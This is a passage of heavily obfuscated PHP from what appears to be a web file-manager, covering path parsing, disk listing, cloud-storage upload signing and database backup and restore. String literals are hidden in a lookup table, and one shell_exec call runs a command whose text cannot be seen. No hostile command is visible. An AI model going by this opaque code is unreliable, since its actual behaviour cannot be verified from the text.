KOD_USER_SHARE_TO_ME = "\x7b\163\150\x61\162\145\x54\157\115\x65\175"; const KOD_SHARE_ITEM = "\x7b\163\x68\141\162\145\x49\164\x65\155\175"; const KOD_SHARE_LINK = "\173\163\150\x61\x72\145\111\x74\x65\x6d\x4c\151\156\x6b\x7d"; const KOD_SEARCH = "\x7b\163\145\x61\162\x63\150\175"; const KOD_BLOCK = "\x7b\x62\154\x6f\143\153\175"; const KOD_IO = "\x7b\151\x6f\x7d"; const KOD_USER_RECENT = "\173\165\163\145\x72\x52\x65\156\x63\x65\x6e\164\175"; const KOD_USER_DRIVER = "\x7b\144\x72\x69\x76\x65\x72\175"; public static function typeList() { $¤¡Š‰óü =& $_SERVER[„Ç©ñÎ©]; return array($¤¡Š‰óü[1243] => self::KOD_SOURCE, $¤¡Š‰óü[1244] => self::KOD_USER_RECYCLE, $¤¡Š‰óü[1245] => self::KOD_USER_FAV, $¤¡Š‰óü[1246] => self::KOD_USER_FILE_TAG, $¤¡Š‰óü[1247] => self::KOD_USER_FILE_TYPE, $¤¡Š‰óü[1248] => self::KOD_GROUP_ROOT_SELF, $¤¡Š‰óü[1249] => self::KOD_USER_SHARE, $¤¡Š‰óü[1250] => self::KOD_USER_SHARE_LINK, $¤¡Š‰óü[1251] => self::KOD_USER_SHARE_TO_ME, $¤¡Š‰óü[1252] => self::KOD_SHARE_ITEM, $¤¡Š‰óü[1253] => self::KOD_SHARE_LINK, $¤¡Š‰óü[1254] => self::KOD_SEARCH, $¤¡Š‰óü[1255] => self::KOD_BLOCK, $¤¡Š‰óü[1256] => self::KOD_IO, $¤¡Š‰óü[1257] => self::KOD_USER_RECENT, $¤¡Š‰óü[1258] => self::KOD_USER_DRIVER); } public static function parse($¹å‰™¥¯) { $‹®‹‰§œ =& $_SERVER[„Ç©ñÎ©]; $¹å‰™¥¯ = self::clear($¹å‰™¥¯); $–¨™Ò¨Ô = array_values(self::typeList()); preg_match($‹®‹‰§œ[1259], $¹å‰™¥¯, $Öñ—Ğüš); $Äâ²Úö = array($‹®‹‰§œ[431] => !1, $‹®‹‰§œ[1260] => !1, $‹®‹‰§œ[428] => !1, $‹®‹‰§œ[94] => $¹å‰™¥¯, $‹®‹‰§œ[1169] => !1, $‹®‹‰§œ[1168] => $‹®‹‰§œ[12]); if (is_array($Öñ—Ğüš) && count($Öñ—Ğüš) == 5) { $›¸¥İ™› = $‹®‹‰§œ[1261] . $Öñ—Ğüš[2] . $‹®‹‰§œ[336]; if (in_array($›¸¥İ™›, $–¨™Ò¨Ô)) { $Äâ²Úö[$‹®‹‰§œ[1169]] = $Öñ—Ğüš[1]; $Äâ²Úö[$‹®‹‰§œ[33]] = $›¸¥İ™›; $Äâ²Úö[$‹®‹‰§œ[1262]] = substr($›¸¥İ™›, 1, -1); $Äâ²Úö[$‹®‹‰§œ[408]] = $Öñ—Ğüš[3]; } $Äâ²Úö[$‹®‹‰§œ[1168]] = $Öñ—Ğüš[4]; } $‚ÎÖ¨åÁ = array($‹®‹‰§œ[12], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $Äâ²Úö[$‹®‹‰§œ[1224]] = in_array($Äâ²Úö[$‹®‹‰§œ[33]], $‚ÎÖ¨åÁ); return $Äâ²Úö; } public static function isTruePath($÷´£õ—·) { $ÒÑ»†Ú½ =& $_SERVER[„Ç©ñÎ©]; if (substr($÷´£õ—·, 0, 1) != $ÒÑ»†Ú½[1261]) { return !0; } if (strpos($÷´£õ—·, $ÒÑ»†Ú½[417]) === 0) { return !0; } if (strpos($÷´£õ—·, $ÒÑ»†Ú½[1228]) === 0) { return !0; } if (strpos($÷´£õ—·, $ÒÑ»†Ú½[1263]) === 0) { return !0; } if (strpos($÷´£õ—·, $ÒÑ»†Ú½[1264]) === 0) { return !0; } if (strpos($÷´£õ—·, $ÒÑ»†Ú½[1265]) === 0) { return !0; } return !1; } public static function clear($²˜ñÎ“ú) { $Šà†á·Æ =& $_SERVER[„Ç©ñÎ©]; $²˜ñÎ“ú = str_replace(array($Šà†á·Æ[1077], $Šà†á·Æ[66]), $Šà†á·Æ[53], $²˜ñÎ“ú); $²˜ñÎ“ú = str_replace($Šà†á·Æ[107], $Šà†á·Æ[8], $²˜ñÎ“ú); $İ¶ƒ†Å = $Šà†á·Æ[1266]; if (substr($²˜ñÎ“ú, 0, 3) == $Šà†á·Æ[1267]) { $²˜ñÎ“ú = substr($²˜ñÎ“ú, 3); } while (strstr($²˜ñÎ“ú, $İ¶ƒ†Å)) { $²˜ñÎ“ú = str_replace($İ¶ƒ†Å, $Šà†á·Æ[8], $²˜ñÎ“ú); } $²˜ñÎ“ú = preg_replace($Šà†á·Æ[1268], $Šà†á·Æ[8], $²˜ñÎ“ú); if ($²˜ñÎ“ú == $Šà†á·Æ[8]) { return $Šà†á·Æ[8]; } $²˜ñÎ“ú = rtrim($²˜ñÎ“ú, $Šà†á·Æ[8]); return $²˜ñÎ“ú; } public static function sourceID($ÕŞå§Œá) { $şşÍ¾¢¸ =& $_SERVER[„Ç©ñÎ©]; $Ÿ²ë¤åø = self::parse($ÕŞå§Œá); if ($Ÿ²ë¤åø[$şşÍ¾¢¸[33]] !== self::KOD_SOURCE) { show_json(LNG($şşÍ¾¢¸[1269]), !1); } return $Ÿ²ë¤åø[$şşÍ¾¢¸[408]]; } public static function make($èÔÕşï²) { if (!$èÔÕşï²) { return !1; } return self::makePath(self::KOD_SOURCE, intval($èÔÕşï²)); } public static function makeShare($¨Ö¥…Éş, $Œ·Éİ±) { return self::makePath(self::KOD_SHARE_ITEM, $¨Ö¥…Éş, $Œ·Éİ±); } public static function makeFileTypePath($ÈÏÄ†ìÆ) { return self::makePath(self::KOD_USER_FILE_TYPE, $ÈÏÄ†ìÆ); } public static function makeFileTagPath($æ§±æ¦) { return self::makePath(self::KOD_USER_FILE_TAG, $æ§±æ¦); } public static function makePath($Ïïö¤êÅ, $ØÀî¹ÏÈ = '', $ÊÓªÆ¼Ô = '') { $ÌÒ¤ªÒœ =& $_SERVER[„Ç©ñÎ©]; $˜›ËÓğÌ = substr($Ïïö¤êÅ, 1, -1); $ÄÕÉº ª = $ÌÒ¤ªÒœ[1270] . $˜›ËÓğÌ . $ÌÒ¤ªÒœ[1271] . $ØÀî¹ÏÈ . $ÌÒ¤ªÒœ[1272]; $ÄÕÉº ª = $ÊÓªÆ¼Ô ? $ÄÕÉº ª . $ÊÓªÆ¼Ô . $ÌÒ¤ªÒœ[8] : $ÄÕÉº ª; return $ÄÕÉº ª; } public static function hashPath($Œ®—ñ›Ë, $§¤ÜÜê± = true) { $æîµ¯ş´ =& $_SERVER[„Ç©ñÎ©]; $ÄêŒĞÆŞ = is_array($Œ®—ñ›Ë) ? $Œ®—ñ›Ë : IO::info($Œ®—ñ›Ë); $•¯ÀÇ«ú = _get($ÄêŒĞÆŞ, $æîµ¯ş´[1273], $æîµ¯ş´[12]); if (!$•¯ÀÇ«ú && isset($ÄêŒĞÆŞ[$æîµ¯ş´[411]])) { $ÄêŒĞÆŞ = IO::info(KodIO::make($ÄêŒĞÆŞ[$æîµ¯ş´[411]])); $•¯ÀÇ«ú = _get($ÄêŒĞÆŞ, $æîµ¯ş´[1273], $æîµ¯ş´[12]); } if (!$•¯ÀÇ«ú && $§¤ÜÜê±) { $¶ıçÙÓ¡ = KodIO::parse($ÄêŒĞÆŞ[$æîµ¯ş´[94]]); if (!$¶ıçÙÓ¡[$æîµ¯ş´[33]]) { $•¯ÀÇ«ú = IO::hashSimple($ÄêŒĞÆŞ[$æîµ¯ş´[94]]); } } if (!$•¯ÀÇ«ú) { $•¯ÀÇ«ú = md5($ÄêŒĞÆŞ[$æîµ¯ş´[94]] . $ÄêŒĞÆŞ[$æîµ¯ş´[86]] . $ÄêŒĞÆŞ[$æîµ¯ş´[95]]); } return $•¯ÀÇ«ú; } public static function initSystemPath() { $™üîÃ‚Î =& $_SERVER[„Ç©ñÎ©]; if (defined($™üîÃ‚Î[1274])) { return; } define($™üîÃ‚Î[1274], self::systemPath($™üîÃ‚Î[1275])); define($™üîÃ‚Î[1276], self::systemPath($™üîÃ‚Î[1277])); define($™üîÃ‚Î[1278], self::systemPath($™üîÃ‚Î[1279])); define($™üîÃ‚Î[1280], self::systemPath($™üîÃ‚Î[1281])); IOHistory::bindEvent(); } public static function systemPath($°ÒÕ¬ãõ) { $Û±²•·ş =& $_SERVER[„Ç©ñÎ©]; $ÚƒñÕÌÑ = $Û±²•·ş[1282] . ucfirst($°ÒÕ¬ãõ); $ó³îÊŒ = Model($Û±²•·ş[773])->get($ÚƒñÕÌÑ); if ($ó³îÊŒ) { return $ó³îÊŒ; } if ($°ÒÕ¬ãõ == $Û±²•·ş[1275]) { $ó³îÊŒ = self::make(Model($Û±²•·ş[828])->systemRootPathAdd($Û±²•·ş[553])); } else { $ó³îÊŒ = self::systemPath($Û±²•·ş[1275]); $ÉÄñé§À = self::sourceID($ó³îÊŒ); $ó³îÊŒ = self::make(Model($Û±²•·ş[828])->mkdir($ÉÄñé§À, $°ÒÕ¬ãõ)); } Model($Û±²•·ş[773])->set($ÚƒñÕÌÑ, $ó³îÊŒ); return $ó³îÊŒ; } public static function systemFolder($ì–‹îôí) { $ºÅÙíïÌ = IO_PATH_SYSTEM_SOURCE . $ì–‹îôí; $º’½ÃÁŠ = Cache::get($ºÅÙíïÌ); if (!$º’½ÃÁŠ) { $ µ÷ÃÉ£ = IO::infoFull($ºÅÙíïÌ); if (!$ µ÷ÃÉ£) { $º’½ÃÁŠ = IO::mkdir($ºÅÙíïÌ, REPEAT_SKIP); } else { $º’½ÃÁŠ = $ µ÷ÃÉ£[$_SERVER[„Ç©ñÎ©][94]]; } Cache::set($ºÅÙíïÌ, $º’½ÃÁŠ, 3600 * 10); } return $º’½ÃÁŠ; } public static function defaultDriver() { return Model($_SERVER[„Ç©ñÎ©][770])->defaultDriver(); } public static function defaultIO() { $öâ½òÑ =& $_SERVER[„Ç©ñÎ©]; $»‚é¯º = self::defaultDriver(); return $öâ½òÑ[1283] . $»‚é¯º[$öâ½òÑ[408]] . $öâ½òÑ[1272]; } public static function defaultDriverInit() { static $ş«‰ÂÎ = false; if ($ş«‰ÂÎ) { return $ş«‰ÂÎ; } $ş«‰ÂÎ = IO::init(self::defaultIO()); return $ş«‰ÂÎ; } public static function fileTypeList() { $Ñ³ŸÁÀâ =& $_SERVER[„Ç©ñÎ©]; $™µåĞÙ = $GLOBALS[$Ñ³ŸÁÀâ[6]][$Ñ³ŸÁÀâ[1284]]; foreach ($™µåĞÙ as $ÃÎôÃ·­ => $¨Ñ™Ò·İ) { $ÂêğÓÍ = $Ñ³ŸÁÀâ[1285] . $ÃÎôÃ·­; $¦¯¢µá = LNG($ÂêğÓÍ); if ($ÂêğÓÍ != $¦¯¢µá) { $™µåĞÙ[$ÃÎôÃ·­][$Ñ³ŸÁÀâ[32]] = $¦¯¢µá; } } return $™µåĞÙ; } public static function diskList($ş¢ÁÃ… = true) { $’Ì³÷± = $_SERVER[„Ç©ñÎ©][1286]; if ($ş¢ÁÃ…) { $û™ªÚí = Cache::get($’Ì³÷±); if (is_array($û™ªÚí)) { return $û™ªÚí; } } $û™ªÚí = self::diskListGet(); Cache::set($’Ì³÷±, $û™ªÚí, 60); return $û™ªÚí; } public static function diskListGet() { $†íªÅ¢Å =& $_SERVER[„Ç©ñÎ©]; $ƒŞÁ÷²ñ = array(); if ($GLOBALS[$†íªÅ¢Å[6]][$†íªÅ¢Å[1287]] == $†íªÅ¢Å[1288]) { $æ¾¿’¥© = $†íªÅ¢Å[1289]; for ($ãì”ïñ = 0; $ãì”ïñ < strlen($æ¾¿’¥©); $ãì”ïñ++) { $ë‹âÉôà = $æ¾¿’¥©[$ãì”ïñ] . $†íªÅ¢Å[1290]; if (file_exists($ë‹âÉôà)) { $ƒŞÁ÷²ñ[] = $ë‹âÉôà; } } return $ƒŞÁ÷²ñ; } if (!function_exists($†íªÅ¢Å[108])) { $ƒŞÁ÷²ñ[] = $†íªÅ¢Å[838]; return $ƒŞÁ÷²ñ; } $‹ÈÕ¨† = explode($†íªÅ¢Å[66], shell_exec($†íªÅ¢Å[1291])); array_shift($‹ÈÕ¨†); array_pop($‹ÈÕ¨†); $÷â§© ë = array($†íªÅ¢Å[1292], $†íªÅ¢Å[1293], $†íªÅ¢Å[1294], $†íªÅ¢Å[1295], $†íªÅ¢Å[1296], $†íªÅ¢Å[1297], $†íªÅ¢Å[1298], $†íªÅ¢Å[1299]); foreach ($‹ÈÕ¨† as $§ú†¾á) { $ÂÆóöÈ¡ = preg_split($†íªÅ¢Å[1300], $§ú†¾á); $ë‹âÉôà = $ÂÆóöÈ¡[count($ÂÆóöÈ¡) - 1]; if (!strstr($ÂÆóöÈ¡[0], $†íªÅ¢Å[1301]) || !$ë‹âÉôà) { continue; } $ôÑ½ìÇÓ = rtrim($ë‹âÉôà, $†íªÅ¢Å[8]) . $†íªÅ¢Å[8]; if (in_array($ôÑ½ìÇÓ, $÷â§© ë)) { continue; } $ƒŞÁ÷²ñ[] = $ôÑ½ìÇÓ; } return $ƒŞÁ÷²ñ; } public static function isSameDisk($°Ï¤Ìö, $³Õ²¸Ûš) { $©Ô‹·Ñ› =& $_SERVER[„Ç©ñÎ©]; if ($GLOBALS[$©Ô‹·Ñ›[6]][$©Ô‹·Ñ›[1287]] == $©Ô‹·Ñ›[1288]) { return strtolower(substr($°Ï¤Ìö, 0, 1)) == strtolower(substr($³Õ²¸Ûš, 0, 1)); } $Œ¶º¥ = self::diskList(); $ŞŞï”ÆŞ = !1; $¢Ì¨¸£ş = !1; sort($Œ¶º¥); $Œ¶º¥ = array_reverse($Œ¶º¥); $°Ï¤Ìö = rtrim($°Ï¤Ìö, $©Ô‹·Ñ›[8]) . $©Ô‹·Ñ›[8]; $³Õ²¸Ûš = rtrim($³Õ²¸Ûš, $©Ô‹·Ñ›[8]) . $©Ô‹·Ñ›[8]; foreach ($Œ¶º¥ as $³Ğ÷‹·„) { $å¤»üõé = strlen($³Ğ÷‹·„); if (!$ŞŞï”ÆŞ && substr($°Ï¤Ìö, 0, $å¤»üõé) == $³Ğ÷‹·„) { $ŞŞï”ÆŞ = $³Ğ÷‹·„; } if (!$¢Ì¨¸£ş && substr($³Õ²¸Ûš, 0, $å¤»üõé) == $³Ğ÷‹·„) { $¢Ì¨¸£ş = $³Ğ÷‹·„; } if ($ŞŞï”ÆŞ && $¢Ì¨¸£ş) { break; } } return $ŞŞï”ÆŞ === $¢Ì¨¸£ş; } public static function transferType($…´†Şîê, $²ßÑ¾½) { $–ü´Ü™ =& $_SERVER[„Ç©ñÎ©]; $¶§Ë‹İÉ = self::driverType($…´†Şîê); $‡ŞÄáüî = self::driverType($²ßÑ¾½); if ($¶§Ë‹İÉ[$–ü´Ü™[33]] == $‡ŞÄáüî[$–ü´Ü™[33]] && $¶§Ë‹İÉ[$–ü´Ü™[1302]] == $‡ŞÄáüî[$–ü´Ü™[1302]]) { return $–ü´Ü™[1303]; } if ($¶§Ë‹İÉ[$–ü´Ü™[33]] == $–ü´Ü™[867] && $‡ŞÄáüî[$–ü´Ü™[33]] == $–ü´Ü™[116]) { return $–ü´Ü™[1198]; } if ($¶§Ë‹İÉ[$–ü´Ü™[33]] == $–ü´Ü™[116] && $‡ŞÄáüî[$–ü´Ü™[33]] == $–ü´Ü™[867]) { return $–ü´Ü™[117]; } return $–ü´Ü™[1304]; } public static function driverType($£Î®¶“) { $·¿›ã =& $_SERVER[„Ç©ñÎ©]; $–´…âË¤ = str_replace($·¿›ã[1305], $·¿›ã[12], strtolower($£Î®¶“->getType())); if ($–´…âË¤ == $·¿›ã[761] || $–´…âË¤ == $·¿›ã[1306] || $–´…âË¤ == $·¿›ã[1307]) { $£Î®¶“ = self::defaultDriverInit(); } else { if ($–´…âË¤ == $·¿›ã[1205] || $–´…âË¤ == $·¿›ã[1308]) { $£Î®¶“ = IO::init($£Î®¶“->pathParse[$·¿›ã[1150]]); } } $ğµ™ÒıÆ = $£Î®¶“->path; $–´…âË¤ = str_replace($·¿›ã[1305], $·¿›ã[12], strtolower($£Î®¶“->getType())); if ($–´…âË¤ == $·¿›ã[116]) { return array($·¿›ã[33] => $·¿›ã[116], $·¿›ã[1302] => $·¿›ã[12], $·¿›ã[94] => $ğµ™ÒıÆ); } return array($·¿›ã[33] => $·¿›ã[867], $·¿›ã[1302] => $£Î®¶“->pathDriver, $·¿›ã[94] => $ğµ™ÒıÆ); } public static function pathDriverType($íéÂÂ) { return $íéÂÂ ? self::driverType(IO::init($íéÂÂ)) : !1; } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($ÃÁÖÉ•ú) { parent::__construct($ÃÁÖÉ•ú); $this->signatureVersion($_SERVER[„Ç©ñÎ©][226]); } public function uploadFormData($ñ„½ÓÓ¬, $˜Ñşüçë = 3600) { $”Ïæø»† =& $_SERVER[„Ç©ñÎ©]; $Şí´¡§Á = $”Ïæø»†[208]; $·‰í›Ò = $”Ïæø»†[241]; $Ç·ç ¸‡ = $”Ïæø»†[1309]; $„üÍ•Æï = gmdate($”Ïæø»†[1310], time() + $˜Ñşüçë); $Æ´»“³Ò = (string) time() . $”Ïæø»†[81] . (string) (time() + $˜Ñşüçë); $ì²Â†£‡ = array($”Ïæø»†[1311] => $„üÍ•Æï, $”Ïæø»†[1312] => array(array($”Ïæø»†[1313] => $Şí´¡§Á), array($”Ïæø»†[1314] => $this->bucket), array($”Ïæø»†[1315], $”Ïæø»†[1316], $”Ïæø»†[12]), array($”Ïæø»†[1317] => $Ç·ç ¸‡), array($”Ïæø»†[1318] => $·‰í›Ò), array($”Ïæø»†[1319] => $this->accessKey), array($”Ïæø»†[1320] => $Æ´»“³Ò))); $ì²Â†£‡ = json_encode($ì²Â†£‡); $Ê„¥•Ãó = hash_hmac($”Ïæø»†[241], $Æ´»“³Ò, $this->secret); $ÂæÛÉ£¸ = sha1($ì²Â†£‡); $„™ï¹‰¸ = hash_hmac($”Ïæø»†[241], $ÂæÛÉ£¸, $Ê„¥•Ãó); $ˆ³û¢ŞÔ = array($”Ïæø»†[1313] => $Şí´¡§Á, $”Ïæø»†[1317] => $Ç·ç ¸‡, $”Ïæø»†[1321] => base64_encode($ì²Â†£‡), $”Ïæø»†[1318] => $·‰í›Ò, $”Ïæø»†[1319] => $this->accessKey, $”Ïæø»†[1322] => $Æ´»“³Ò, $”Ïæø»†[1323] => $„™ï¹‰¸, $”Ïæø»†[191] => $this->getHost()); return $ˆ³û¢ŞÔ; } public function fileOutLink($ÓæÒÌ¯) { $µ‡Ç“ =& $_SERVER[„Ç©ñÎ©]; if (substr($ÓæÒÌ¯, 0, 7) == $µ‡Ç“[1324]) { $ÓæÒÌ¯ = $µ‡Ç“[1325] . substr($ÓæÒÌ¯, 7); } header($µ‡Ç“[171] . $ÓæÒÌ¯); die; } } goto dÚäÍ¿—; C¦ ­·Œˆ: class DbManage { function __construct($Ô‹êñ¯— = array()) { $åíĞôÅÆ =& $_SERVER[„Ç©ñÎ©]; if (empty($Ô‹êñ¯—)) { $Ô‹êñ¯— = $GLOBALS[$åíĞôÅÆ[6]][$åíĞôÅÆ[21]]; } $this->database = $Ô‹êñ¯—; } public function model($ÎŸ•Åõİ = '') { return new ModelBase($ÎŸ•Åõİ, $_SERVER[„Ç©ñÎ©][12], $this->database); } public function db($¿’Şî´  = false) { $¥ûö£ùü =& $_SERVER[„Ç©ñÎ©]; $Ü¸‰êÑÜ = array_change_key_case($this->database); if ($this->dbType() == $¥ûö£ùü[13] || !$¿’Şî´ ) { return $this->model()->db(); } $È¥‚ß‚Î = $Ü¸‰êÑÜ[$¥ûö£ùü[971]]; $Ü¸‰êÑÜ[$¥ûö£ùü[971]] = $¥ûö£ùü[12]; if ($Ü¸‰êÑÜ[$¥ûö£ùü[966]] == $¥ûö£ùü[963]) { $×ôÅßØ— = $Ü¸‰êÑÜ[$¥ûö£ùü[972]]; $Ü¸‰êÑÜ[$¥ûö£ùü[972]] = substr($×ôÅßØ—, 0, strrpos($×ôÅßØ—, $¥ûö£ùü[1058])); } $this->database = $Ü¸‰êÑÜ; $¡¯Û§Â = $this->model()->db(); try { $ïß©€½· = $¡¯Û§Â->execute("\x73\150\157\x77\x20\144\141\164\141\x62\141\x73\x65\x73\40\154\151\x6b\145\x20\47{$È¥‚ß‚Î}\47"); } catch (Exception $í‚³ß–÷) { } if (!$ïß©€½·) { $¡¯Û§Â->execute("\143\162\145\141\x74\x65\x20\x64\x61\x74\141\x62\141\163\145\x20\x60{$È¥‚ß‚Î}\140"); } $Ü¸‰êÑÜ[$¥ûö£ùü[971]] = $È¥‚ß‚Î; if ($Ü¸‰êÑÜ[$¥ûö£ùü[966]] == $¥ûö£ùü[963]) { $Ü¸‰êÑÜ[$¥ûö£ùü[972]] .= $¥ûö£ùü[1058] . $È¥‚ß‚Î; } $this->database = $Ü¸‰êÑÜ; $¡¯Û§Â->execute("\165\163\145\x20\140{$È¥‚ß‚Î}\140"); return $¡¯Û§Â; } public function createTable($÷¤Áúêª, &$äŞ¦•Œ¶) { $³˜œ¼Ê =& $_SERVER[„Ç©ñÎ©]; if (!IO::exist($÷¤Áúêª)) { ActionCall($³˜œ¼Ê[1059], !0, 0); show_json(LNG($³˜œ¼Ê[1060]), !1); } $’À‚Î“ß = $this->model()->db(); $Àî„È°™ = sqlSplit(IO::getContent($÷¤Áúêª)); foreach ($Àî„È°™ as $Ç¥ØÍØ) { $ã­Ø¸¾ = stripos($Ç¥ØÍØ, $³˜œ¼Ê[1061]) === 0; if ($ã­Ø¸¾) { $äŞ¦•Œ¶->task[$³˜œ¼Ê[789]] += 1; } $’À‚Î“ß->execute($Ç¥ØÍØ); if ($ã­Ø¸¾) { preg_match($³˜œ¼Ê[1062], $Ç¥ØÍØ, $ŒûîŸç); $äŞ¦•Œ¶->task[$³˜œ¼Ê[1063]] = $ŒûîŸç[1]; $äŞ¦•Œ¶->update(1); } } } public function insertTable($ÊŸÜøè™, &$Ö†®Ùİ‹) { $¶À±Á’ =& $_SERVER[„Ç©ñÎ©]; $èÂİœÊâ = $this->model()->db(); $›¸¾ûâì = $ŞÉÅËó² ? array($ŞÉÅËó²) : $èÂİœÊâ->getTables(); foreach ($ÊŸÜøè™ as $¥Š”™‚ı) { $ŞÉÅËó² = basename($¥Š”™‚ı, $¶À±Á’[791]); if (!in_array($ŞÉÅËó², $›¸¾ûâì)) { continue; } $Ö†®Ùİ‹->task[$¶À±Á’[1063]] = $ŞÉÅËó²; if (get_filesize($¥Š”™‚ı) == 0) { continue; } $­¡Íê›‰ = $this->sqlToDb($¥Š”™‚ı, $Ö†®Ùİ‹); if (!$­¡Íê›‰) { ActionCall($¶À±Á’[1059], !0, 0); show_json(LNG($¶À±Á’[1064]) . "\133{$ŞÉÅËó²}\x5d", !1); } } } public function sqlFromDb($†Èı¶Ü­, $ã»¶µƒ, &$ş§æ™•ô, $”£ËÛÀ‚ = '') { if ($ş§æ™•ô) { $ş§æ™•ô->task[$_SERVER[„Ç©ñÎ©][1063]] = $†Èı¶Ü­; } $ÊÄ½ù“ù = $this->model($†Èı¶Ü­); $‡œ÷¹ŠÔ = 0; $‘ëò€õœ = 0; $ß¼Ùš´á = 10000; $İ‚–ÙïÕ = fopen($ã»¶µƒ, $_SERVER[„Ç©ñÎ©][1065]); $Ø°Äõ° = $ÊÄ½ù“ù->getPk(); $æ™ş‹Ò© = $ÊÄ½ù“ù->getDbFields(); $ìÎ¶­ØÒ = $_SERVER[„Ç©ñÎ©][12]; if ($GLOBALS[$_SERVER[„Ç©ñÎ©][790]] && in_array($†Èı¶Ü­, array($_SERVER[„Ç©ñÎ©][1066], $_SERVER[„Ç©ñÎ©][1067]))) { $ìÎ¶­ØÒ = $†Èı¶Ü­; } do { $ùµïÏ¥ó = array($Ø°Äõ° => array($_SERVER[„Ç©ñÎ©][1013], $‘ëò€õœ)); $ÈîıáÆ¢ = $ÊÄ½ù“ù->where($ùµïÏ¥ó)->field($æ™ş‹Ò©)->order($Ø°Äõ° . $_SERVER[„Ç©ñÎ©][1068])->limit($ß¼Ùš´á)->select(); $ÈîıáÆ¢ = !empty($ÈîıáÆ¢) ? $ÈîıáÆ¢ : array(); if (!($õÏ„·”ş = count($ÈîıáÆ¢))) { break; } $¶ªÚ£©Š = end($ÈîıáÆ¢); $‘ëò€õœ = $¶ªÚ£©Š[$Ø°Äõ°]; $÷Ğ¶÷ÎÇ = array(); foreach ($ÈîıáÆ¢ as $‘ğ†íÈê) { if ($ìÎ¶­ØÒ) { if ($†Èı¶Ü­ == $_SERVER[„Ç©ñÎ©][1066]) { if ($‘ğ†íÈê[$_SERVER[„Ç©ñÎ©][33]] == $_SERVER[„Ç©ñÎ©][1069]) { $Üğ­®„ñ = json_decode($‘ğ†íÈê[$_SERVER[„Ç©ñÎ©][383]], !0); if ($Üğ­®„ñ[$_SERVER[„Ç©ñÎ©][32]] == $GLOBALS[$_SERVER[„Ç©ñÎ©][790]] && $Üğ­®„ñ[$_SERVER[„Ç©ñÎ©][753]] != 1) { continue; } } } else { if ($‘ğ†íÈê[$_SERVER[„Ç©ñÎ©][33]] == $_SERVER[„Ç©ñÎ©][1070] && $‘ğ†íÈê[$_SERVER[„Ç©ñÎ©][104]] == $_SERVER[„Ç©ñÎ©][782]) { continue; } } } if ($”£ËÛÀ‚) { $‘ğ†íÈê[$_SERVER[„Ç©ñÎ©][94]] = "\173\151\157\72{$”£ËÛÀ‚}\x7d" . substr($‘ğ†íÈê[$_SERVER[„Ç©ñÎ©][94]], strlen("\x7b\151\x6f\72{$‘ğ†íÈê[$_SERVER[„Ç©ñÎ©][820]]}\175")); $‘ğ†íÈê[$_SERVER[„Ç©ñÎ©][820]] = $”£ËÛÀ‚; } $÷Ğ¶÷ÎÇ[] = $_SERVER[„Ç©ñÎ©][1071] . $this->sqlEncode($‘ğ†íÈê) . $_SERVER[„Ç©ñÎ©][1072]; } $İ¶íİË = "\x49\x4e\x53\x45\x52\x54\x20\x49\x4e\124\117\x20\140{$†Èı¶Ü­}\x60\40\50\x60" . implode($_SERVER[„Ç©ñÎ©][1073], $æ™ş‹Ò©) . $_SERVER[„Ç©ñÎ©][1074]; fwrite($İ‚–ÙïÕ, $İ¶íİË . implode($_SERVER[„Ç©ñÎ©][1075], $÷Ğ¶÷ÎÇ) . $_SERVER[„Ç©ñÎ©][81] . PHP_EOL); $‡œ÷¹ŠÔ += $õÏ„·”ş; if ($ş§æ™•ô) { $ş§æ™•ô->update($õÏ„·”ş); } } while ($ß¼Ùš´á == $õÏ„·”ş); fclose($İ‚–ÙïÕ); return $‡œ÷¹ŠÔ; } public function sqlToDb($«‡ƒ“å, &$ÜÛâÉ²³) { $ÁŒÊ… =& $_SERVER[„Ç©ñÎ©]; $œô§ú—á = $this->model()->db(); $İÂ´ØÈ° = @fopen($«‡ƒ“å, $ÁŒÊ…[1076]); if (!$İÂ´ØÈ°) { return !1; } $ó’¬Íè = 0; $é¯Ÿ› = $ÁŒÊ…[12]; $•ûû£ Ğ = array(); $É¼˜­½± = $this->dbType(); $è‚»àøÂ = $É¼˜­½± == $ÁŒÊ…[13] ? 500 : 2000; $É¤ÒªĞò = basename($«‡ƒ“å, $ÁŒÊ…[791]); $«˜íŒğ“ = 0; $·Æóíõ = 4194304 - 104858; $“å—µ´ = 1000000 - 104858; while (!feof($İÂ´ØÈ°)) { $×±Ø†…Ì = trim(fgets($İÂ´ØÈ°)); if (!$×±Ø†…Ì) { continue; } $è²ç«›¨ = $this->sqlDecode($×±Ø†…Ì, $É¼˜­½±, $É¤ÒªĞò); if (stripos($è²ç«›¨, $ÁŒÊ…[364]) === 0) { if (!$é¯Ÿ›) { $é¯Ÿ› = $è²ç«›¨ . $ÁŒÊ…[53]; } continue; } if ($ÜÛâÉ²³) { $ÜÛâÉ²³->task[$ÁŒÊ…[789]] += 1; } $ó’¬Íè++; $•ûû£ Ğ[] = rtrim(rtrim(trim($è²ç«›¨), $ÁŒÊ…[50]), $ÁŒÊ…[81]); $¯È¾ğô = null; $áÆ¡èÑ© = strlen($è²ç«›¨); $«˜íŒğ“ += $áÆ¡èÑ©; if ($«˜íŒğ“ >= ($è‚»àøÂ == 500 ? $“å—µ´ : $·Æóíõ)) { $¯È¾ğô = array_pop($•ûû£ Ğ); if ($ó’¬Íè > 1) { $ó’¬Íè--; } } if ($ó’¬Íè >= $è‚»àøÂ || $¯È¾ğô) { $è²ç«›¨ = $é¯Ÿ› . implode($ÁŒÊ…[50], $•ûû£ Ğ); if (!$œô§ú—á->execute($è²ç«›¨)) { return !1; } if ($ÜÛâÉ²³) { $ÜÛâÉ²³->update($ó’¬Íè); } $•ûû£ Ğ = array(); $ó’¬Íè = 0; $«˜íŒğ“ = 0; if ($¯È¾ğô) { $•ûû£ Ğ = array($¯È¾ğô); $ó’¬Íè = 1; $«˜íŒğ“ = $áÆ¡èÑ©; } } } fclose($İÂ´ØÈ°); if (!empty($•ûû£ Ğ)) { $è²ç«›¨ = $é¯Ÿ› . implode($ÁŒÊ…[50], $•ûû£ Ğ); if (!$œô§ú—á->execute($è²ç«›¨)) { return !1; } if ($ÜÛâÉ²³) { $ÜÛâÉ²³->update($ó’¬Íè); } } return !0; } public function dropTable($°½şšÍ = null) { $¬Àì¬Óî = $this->model()->db(); $İï¼üùÙ = $°½şšÍ ? array($°½şšÍ) : $¬Àì¬Óî->getTables(); if (!$İï¼üùÙ) { return; } foreach ($İï¼üùÙ as $°½şšÍ) { if ($°½şšÍ) { $°½şšÍ = strtolower($°½şšÍ); } else { continue; } 